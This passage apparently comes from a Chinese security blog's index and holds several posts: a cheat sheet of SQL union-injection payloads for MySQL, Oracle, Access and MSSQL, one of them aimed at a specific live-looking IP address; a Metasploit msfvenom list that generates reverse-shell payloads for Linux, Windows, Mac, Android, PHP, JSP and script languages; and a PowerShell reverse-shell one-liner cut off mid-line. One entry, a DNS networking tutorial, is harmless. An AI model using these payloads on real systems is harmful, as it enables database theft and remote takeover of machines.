class="line">3.https:&#x2F;&#x2F;gist.github.com&#x2F;ujin5&#x2F;5b9a2ce2ffaf8f4222fe7381f792cb38</span><br><span class="line">4.https:&#x2F;&#x2F;docs.google.com&#x2F;drawings&#x2F;d&#x2F;1TuECFL9K7J5q5UePJLC-YH3satvb1RrjLRH-tW_VKeE&#x2F;edit</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入-联合查询总结</title>
      <link href="2020/09/23/sql%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%80%BB%E7%BB%93/"/>
      <url>2020/09/23/sql%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>联合查询注入利用的条件：页面上有显示位</p><p>联合注入的过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1、判断注入点</span><br><span class="line"></span><br><span class="line">2、判断是整型还是字符型</span><br><span class="line"></span><br><span class="line">3、判断查询列数</span><br><span class="line"></span><br><span class="line">4、判断显示位</span><br><span class="line"></span><br><span class="line">5、获取所有数据库名</span><br><span class="line"></span><br><span class="line">6、获取数据库所有表名</span><br><span class="line"></span><br><span class="line">7、获取字段名</span><br><span class="line"></span><br><span class="line">8、获取字段中的数据</span><br></pre></td></tr></table></figure><p>数据库判断：<br>1.用@@datadir查看数据库安装目录，能否判断出<br>2.通过各个数据库特有的数据表来判断:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mssql:and (select count(*) from sysobjects)&gt;0 and 1&#x3D;1</span><br><span class="line">Accese:and (select count(*) from msysobjects)&gt;0 and 1&#x3D;1</span><br><span class="line">mysql:and (select count(*) from information_schema.TABLES)&gt;0 and 1&#x3D;1 </span><br><span class="line">oracle:and (select count(*) from sys.user_tables)&gt;0 and 1&#x3D;1</span><br></pre></td></tr></table></figure><p><strong>终极法宝 ：报错信息！！！！！！！！！！</strong></p><h3 id="mysql注入："><a href="#mysql注入：" class="headerlink" title="mysql注入："></a>mysql注入：</h3><p>注入判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#39;</span><br><span class="line">&quot;</span><br><span class="line">And 1&#x3D;1</span><br><span class="line">ord(0x1)</span><br><span class="line">&gt; </span><br><span class="line">\\</span><br><span class="line">&#x2F;</span><br><span class="line">#</span><br><span class="line">--+-</span><br><span class="line">^1^0</span><br></pre></td></tr></table></figure><p>字段数判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Order by 3 --</span><br></pre></td></tr></table></figure><p>获取所有数据库名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><p>获取表名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Union select table_name from information_schema.tables where table_schema&#x3D;database() --</span><br></pre></td></tr></table></figure><p>获取字段名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Union select column_name from information_schema.columns where table_schema&#x3D;table_name -</span><br></pre></td></tr></table></figure><p>查询数据:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(concat_ws(char(32,58,32),first_name,password))  from users --</span><br></pre></td></tr></table></figure><p>内置函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">拆解数据库名：database() 用户名：user() 版本：version() 或 @@version</span><br><span class="line">数据库路径：@@datadir</span><br></pre></td></tr></table></figure><p><strong>mysql</strong>通过information_schema这个表查询相应的数据库名，表名，字段名。</p><h3 id="oracle注入："><a href="#oracle注入：" class="headerlink" title="oracle注入："></a>oracle注入：</h3><p>获取数据库所有用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT username FROM all_users;</span><br><span class="line">SELECT name FROM sys.user$; -- 需要高权限</span><br></pre></td></tr></table></figure><p>获取当前数据库用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT user FROM dual;</span><br></pre></td></tr></table></figure><p>字段数判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by 3 --</span><br><span class="line">and 1&#x3D;2 union select null,null,null from dual--</span><br></pre></td></tr></table></figure><p>判断子段的数据类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;2 union select &#39;null&#39;,null,null from dual--  &#x2F;&#x2F;返回正常，则第一个字段是字符型，返回错误，为字符型，返回错误，为字符型</span><br></pre></td></tr></table></figure><p>数据库信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;2 union select null,(select banner from sys.v_$version where rownum&#x3D;1),null from dual--  &#x2F;&#x2F;探测数据库版本信息</span><br></pre></td></tr></table></figure><p>查询表名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1),null from dual--  &#x2F;&#x2F;查询第一个表名</span><br><span class="line">and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1 and table_name&lt;&gt;&#39;STUDENT&#39;),null from dual--  &#x2F;&#x2F;第二个表名</span><br></pre></td></tr></table></figure><p>查询字段名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;2 union select null,(select column_name from user_tab_columns where table_name&#x3D;&#39;[表名]&#39; and rownum&#x3D;1),null from dual-- &#x2F;&#x2F;查看第一个字段名</span><br><span class="line">and 1&#x3D;2 union select null,(select column_name from user_tab_columns where table_name&#x3D;&#39;[表名]&#39; and rownum&#x3D;1 and column_name&lt;&gt;&#39;[第一个字段名]&#39;),null from dual-- &#x2F;&#x2F;查看第二个字段名</span><br><span class="line">and 1&#x3D;2 union select null,(select column_name from user_tab_columns where table_name&#x3D;&#39;[表名]&#39; and rownum&#x3D;1 and column_name&lt;&gt;&#39;[第一个字段名]&#39; and column_name&lt;&gt;&#39;[第二个字段名名]&#39;),null from dual-- &#x2F;&#x2F;查看第三个字段名</span><br></pre></td></tr></table></figure><p>查数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;2 union select id,name,pass from student where id&#x3D;1--  &#x2F;&#x2F;查看数据</span><br><span class="line"></span><br><span class="line">wmsys.wm_concat()等同于MySQL中的group_concat()，在11gr2和12C上已经抛弃，可以用LISTAGG()替代</span><br></pre></td></tr></table></figure><p>如果字符集不匹配：<br>则需要进行字符集转换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cast(&#39;&#39; as nvarchar2(10))</span><br></pre></td></tr></table></figure><p>栗子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.63.200.79:8808&#x2F;?id&#x3D;-1%20union%20all%20select%20NULL,NULL,cast((select%20table_name%20from%20user_tables%20where%20rownum&#x3D;1)%20as%20nvarchar2(10)),1%20from%20dual--%20-</span><br></pre></td></tr></table></figure><h4 id="注意点："><a href="#注意点：" class="headerlink" title="注意点："></a>注意点：</h4><p>1.Oracle 在使用union 查询的跟Mysql不一样Mysql里面我用1,2,3,4就能占位，而在Oracle里面有比较严格的类型要求。也就是说你union select的要和前面的字段类型一样，我们可以用null来代替站位。</p><p>2.Oracle和mysql不一样，分页中没有limit，而是使用三层查询嵌套的方式实现分页(查询第一条数据“&gt;=0&lt;=1”) </p><p>例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM &lt;&#x3D; 1 ) WHERE RN &gt;&#x3D; 0</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3126305494.png"></p><p>3.Oracle的单行注释符号是–，多行注释符号/**/</p><h3 id="Acess数据注入："><a href="#Acess数据注入：" class="headerlink" title="Acess数据注入："></a>Acess数据注入：</h3><p>判断字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 1 --+-</span><br></pre></td></tr></table></figure><p>判断表：</p><p>联合查询表，回显正常即为表存在，反之为不存在。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Union select * from 表名   或  表名还可以使用这种方法来猜表名，</span><br><span class="line"></span><br><span class="line">and 0&lt;&gt;(select count(*) from 表名) </span><br></pre></td></tr></table></figure><p>列名也只能靠猜，如果猜不到就只能使用偏移注入来碰运气了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and exists (select admin from admin)</span><br><span class="line"></span><br><span class="line">and exists (select count(列名) from 表名)</span><br></pre></td></tr></table></figure><p>爆字段内容：</p><p>爆字段内容要分两步，先猜长度，再猜内容猜长度。and (select len(admin) from admin)=5，如果正确则回显正常。</p><p>猜内容，一个一个字段的猜，和盲注一样的道理。and (select asc(mid(admin,1,1)) from admin)&gt;95,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 asc(mid(列名,列数N,1)) from 表名) &gt; x</span><br><span class="line"></span><br><span class="line">top后的数字为该列的第N行，x为ASCII码，列数N就是在这一列中的第几个数字</span><br><span class="line"></span><br><span class="line">asc()仍然还是转换为ascii码的函数，mid(admin,1,1)则为截取admin字段内容的第一个字符的一个字符，也就为第一个字符。</span><br></pre></td></tr></table></figure><h3 id="MSSQL注入："><a href="#MSSQL注入：" class="headerlink" title="MSSQL注入："></a>MSSQL注入：</h3><p>查询当前的用户数据信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 having 1&#x3D;1--+-</span><br></pre></td></tr></table></figure><p>猜表名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and exists(select * from tablename)</span><br><span class="line">?id&#x3D;1 and (Select Count(*) from [表名])&gt;0</span><br></pre></td></tr></table></figure><p>猜字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and (Select Count(字段名) from 表名)&gt;0</span><br></pre></td></tr></table></figure><p>爆当前表中的列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 group by admin.username having 1&#x3D;1–-+-</span><br></pre></td></tr></table></figure><p>猜字段中记录长度：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and (select top 1 len(字段名) from 表名)&gt;0</span><br></pre></td></tr></table></figure><p>猜字段中的ascii值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and (select top 1 asc(mid(字段名,1,1)) from 表名)&gt;0 access</span><br><span class="line">?id&#x3D;1 and (select top 1 unicode(substring(字段名,1,1)) from 数据库名)&gt;0</span><br></pre></td></tr></table></figure><p>查数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT name FROM master..syscolumns WHERE id &#x3D; (SELECT id FROM master..syscolumns WHERE name &#x3D; &#39;tablename&#39;)</span><br></pre></td></tr></table></figure><p>测试权限结构（mssql）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(‘sysadmin’));–</span><br><span class="line">· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(‘serveradmin’));–</span><br><span class="line">· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(‘setupadmin’));–</span><br><span class="line">· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(‘securityadmin’));–</span><br><span class="line">· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(‘diskadmin’));–</span><br><span class="line">· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(‘bulkadmin’));–</span><br><span class="line">· ?id&#x3D;1 and 1&#x3D;(SELECT IS_MEMBER(‘db_owner’));–</span><br></pre></td></tr></table></figure><p>mssql内置函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">· ?id&#x3D;1 and (select @@version)&gt;0　　　获得Windows的版本号</span><br><span class="line">· ?id&#x3D;1 and user_name()&#x3D;’dbo’　　　　 判断当前系统的连接用户是不是sa</span><br><span class="line">· ?id&#x3D;1 and (select user_name())&gt;0　　爆当前系统的连接用户</span><br><span class="line">· ?id&#x3D;1 and (select db_name())&gt;0　　　得到当前连接的数据库</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络工程师必备技能-IP业务之DNS</title>
      <link href="2020/09/22/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%BF%85%E5%A4%87%E6%8A%80%E8%83%BD-IP%E4%B8%9A%E5%8A%A1%E4%B9%8BDNS/"/>
      <url>2020/09/22/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%BF%85%E5%A4%87%E6%8A%80%E8%83%BD-IP%E4%B8%9A%E5%8A%A1%E4%B9%8BDNS/</url>
      
        <content type="html"><![CDATA[<h2 id="DNS-Client"><a href="#DNS-Client" class="headerlink" title="DNS Client"></a>DNS Client</h2><h3 id="静态域名解析"><a href="#静态域名解析" class="headerlink" title="静态域名解析"></a>静态域名解析</h3><p>静态域名解析通过静态域名解析表进行，用户手动建立域名和IP地址之间的对应关系表，将一些常用的域名放入表中。当客户端需要域名所对应的IP地址时，首先到静态域名解析表中查找指定的域名，从而获得所对应的IP地址，提高域名解析的效率。</p><p>动态域名解析：用户程序（例如Ping、Tracert）对域名服务器（DNS Server）的访问是通过DNS客户端（DNS Client）的一个地址解析器（Resolver）完成的。</p><h3 id="动态DNS的工作过程"><a href="#动态DNS的工作过程" class="headerlink" title="动态DNS的工作过程"></a>动态DNS的工作过程</h3><p>用户使用域名访问某些应用服务时，用户程序首先向DNS客户端中的解析器发出请求。</p><p>解析器收到用户程序发送的DNS请求后，首先查询本地的域名缓存。</p><p>本地的域名缓存中存在该域名对应的映射表项，解析器就将域名对应的IP地址返回给用户程序。</p><p>本地的域名缓存没有发现所要查找的映射项，解析器就向域名服务器（DNS Server）发送查询请求。</p><p>域名服务器收到查询报文后，首先判断请求的域名是否处于自己被授权管理的子域里，再根据不同的判断结果，向DNS Client发送相应的响应报文。</p><p>如果是在自己被授权管理的子域范围之内，服务器首先从自己的数据库中查找域名对应的IP地址。</p><p>如果判断该域名不属于本域范围之内，就将请求交给上一级的域名解析服务器处理，直到完成解析，并将解析的结果返回给DNS客户端。</p><p>DNS客户端收到域名服务器的响应报文后，将解析结果返回给应用程序。</p><p>动态域名解析支持缓存功能。每次动态解析成功的域名与IP地址的映射均存放在动态域名缓存区中，当下一次查询相同域名的时候，就可以直接从缓存区中读取，不用再向域名服务器进行请求。缓存区中的映射在一段时间后会被老化删除，以保证及时从域名服务器得到最新的内容。老化时间由域名服务器设置，DNS客户端从协议报文中获得老化时间.</p><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2757956800.png"></p><p>本例静态域名servera,serverb添加到Client中，huawei.com在dns server中。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/81202518.png"></p><p>没有加入前</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3229198517.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3895838296.png"></p><p>加入后</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2036974384.png"></p><p>删掉映射再ping</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2916626236.png"></p><p>因为之前解析成功后，会自动缓存到cache中，就不需要再向服务器发送请求</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工程师养成记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit-有效负载备忘单</title>
      <link href="2020/09/21/Metasploit-%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E5%A4%87%E5%BF%98%E5%8D%95/"/>
      <url>2020/09/21/Metasploit-%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E5%A4%87%E5%BF%98%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>“MSF生成各种有效负载的命令备忘录，建议收藏，忘了就拿出来多看看！”</p></blockquote><h1 id="列出有效载荷："><a href="#列出有效载荷：" class="headerlink" title="列出有效载荷："></a>列出有效载荷：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l</span><br></pre></td></tr></table></figure><h1 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Linux：</span><br><span class="line"></span><br><span class="line">msfvenom -p linux / x86 / meterpreter / reverse_tcp LHOST = &lt;IP地址&gt; LPORT = &lt;要连接端口&gt; -f elf&gt; shell.elf</span><br><span class="line"></span><br><span class="line">Winodw:</span><br><span class="line"></span><br><span class="line">msfvenom -p windows / meterpreter / reverse_tcp LHOST = &lt;IP地址&gt; LPORT = &lt;连接的端口&gt; -f exe&gt; shell.exe</span><br><span class="line"></span><br><span class="line">Mac:</span><br><span class="line"></span><br><span class="line">msfvenom -p osx / x86 / shell_reverse_tcp LHOST = &lt;IP地址&gt; LPORT = &lt;连接的端口&gt; -f macho&gt; shell.macho</span><br><span class="line"></span><br><span class="line">android：<span class="comment">//需要签名</span></span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=&lt;IP地址&gt; LPORT=&lt;连接的端口&gt; -f apk -o payload.apk</span><br><span class="line"></span><br><span class="line">powershell：</span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=&lt;连接的端口&gt; LPORT=&lt;连接的端口&gt; -e cmd/powershell_base64 -i <span class="number">3</span> -f raw -o payload.ps1</span><br></pre></td></tr></table></figure><h1 id="网络有效载荷"><a href="#网络有效载荷" class="headerlink" title="网络有效载荷"></a>网络有效载荷</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line"></span><br><span class="line">msfvenom -p php / meterpreter_reverse_tcp LHOST = &lt;IP地址&gt; LPORT = &lt;连接的端口&gt; -f raw&gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; <span class="keyword">echo</span> <span class="string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line">asp</span><br><span class="line"></span><br><span class="line">msfvenom -p windows / meterpreter / reverse_tcp LHOST = &lt;IP地址&gt; LPORT = &lt;连接的端口&gt; -f asp&gt; shell.asp</span><br><span class="line"></span><br><span class="line">JSP</span><br><span class="line"></span><br><span class="line">msfvenom -p java / jsp_shell_reverse_tcp LHOST = &lt;IP地址&gt; LPORT = &lt;连接的端口&gt; -f raw&gt; shell.jsp</span><br><span class="line"></span><br><span class="line">War：</span><br><span class="line"></span><br><span class="line">msfvenom -p java / jsp_shell_reverse_tcp LHOST = &lt;IP地址&gt; LPORT = &lt;连接的端口&gt; -f war&gt; shell.war</span><br><span class="line"></span><br><span class="line">nodejs:</span><br><span class="line"></span><br><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=&lt;IP地址&gt; LPORT=&lt;连接的端口&gt;  -f raw -o payload</span><br><span class="line"></span><br><span class="line">ruby:</span><br><span class="line"></span><br><span class="line">msfvenom -p ruby/shell_reverse_tcp LHOST=&lt;IP地址&gt; LPORT=&lt;连接的端口&gt; -f raw -o payload.rb</span><br><span class="line"></span><br><span class="line">lua:</span><br><span class="line"></span><br><span class="line">msfvenom -p cmd/unix/reverse_lua LHOST=&lt;IP地址&gt;  LPORT=&lt;连接的端口&gt; -f raw -o payload.lua</span><br></pre></td></tr></table></figure><h1 id="脚本有效负载"><a href="#脚本有效负载" class="headerlink" title="脚本有效负载"></a>脚本有效负载</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Python：</span><br><span class="line"></span><br><span class="line">msfvenom -p cmd / unix / reverse_python LHOST = &lt;IP地址&gt; LPORT = &lt;连接的端口&gt; -f raw&gt; shell.py</span><br><span class="line"></span><br><span class="line">sh脚本</span><br><span class="line"></span><br><span class="line">msfvenom -p cmd / unix / reverse_bash LHOST = &lt;IP地址&gt; LPORT = &lt;连接的端口&gt; -f raw&gt; shell.sh</span><br><span class="line"></span><br><span class="line">Perl</span><br><span class="line"></span><br><span class="line">msfvenom -p cmd / unix / reverse_perl LHOST = &lt;IP地址&gt; LPORT = &lt;连接的端口&gt; -f raw&gt; shell.pl</span><br></pre></td></tr></table></figure><h1 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">基于Linux的Shellcode</span><br><span class="line"></span><br><span class="line">msfvenom -p linux / x86 / meterpreter / reverse_tcp LHOST = &lt;IP地址&gt; LPORT = &lt;连接的端口&gt; -f &lt;语言&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">基于Windows的Shellcode</span><br><span class="line"></span><br><span class="line">msfvenom -p windows / meterpreter / reverse_tcp LHOST = &lt;IP地址&gt; LPORT = &lt;连接的端口&gt; -f &lt;语言&gt;</span><br><span class="line"></span><br><span class="line">基于Mac的Shellcode</span><br><span class="line"></span><br><span class="line">msfvenom -p osx / x86 / shell_reverse_tcp LHOST = &lt;IP地址&gt; LPORT = &lt;要连接的端口&gt; -f &lt;语言&gt;</span><br></pre></td></tr></table></figure><blockquote><p>对于所有shellcode，请参阅“ msfvenom –h”以获取有关有效参数的信息。Msfvenom将输出能够以这种语言剪切和粘贴的代码，来供利用。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hacker必会技能！</title>
      <link href="2020/09/21/hacker%E5%BF%85%E4%BC%9A%E6%8A%80%E8%83%BD/"/>
      <url>2020/09/21/hacker%E5%BF%85%E4%BC%9A%E6%8A%80%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<blockquote><p>“无文件恶意软件是一种操作及其简单但又及其危险的威胁，它能使某些网络防御无效。”</p></blockquote><h1 id="背景资料："><a href="#背景资料：" class="headerlink" title="背景资料："></a>背景资料：</h1><p>网络安全公司CrowdStrike发布了《2020全球威胁态势报告》，其研究结果显示“无文件恶意软件”攻击的趋势增加，无文件恶意软件的攻击数量超过了恶意软件的攻击数量。2019年，51％的攻击使用了无文件恶意软件技术，而在2018年，只有40％的攻击使用了无文件恶意软件技术。</p><blockquote><p>“可以看到无文件恶意软件攻击将会成为以后主流攻击手段，这也让防御方更加头疼！”</p></blockquote><h1 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h1><p>恶意软件攻击定义为：有恶意文件被写入磁盘，导致会被防护产品检测到试图运行该文件，然后识别或阻止它，这些入侵尝试相对来说比较容易拦截和阻止，通常可以用传统的反恶意软件解决方案有效地阻止。<br>恶意软件攻击定义为：初始没有文件或文件片段被写入磁盘的攻击，例如包括代码从内存执行的攻击、或者利用盗取的凭证使用已知工具进行远程登录的攻击，需要更广泛更复杂的检测技术来可靠地识别和拦截，包括行为检测和人类威胁捕获但是什么是无文件恶意软件。</p><blockquote><p>“可以看到无文件恶意软件攻击最大的优点是，一次攻击将不会再执行的.exe或类似的东西，而是直接ARM运行有效载荷！”</p></blockquote><h1 id="Powershell示例："><a href="#Powershell示例：" class="headerlink" title="Powershell示例："></a>Powershell示例：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -c &quot;$client &#x3D; New-Object System.Net.Sockets.TCPClient(&#39;10.0.0.1&#39;,4242);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte &#x3D; 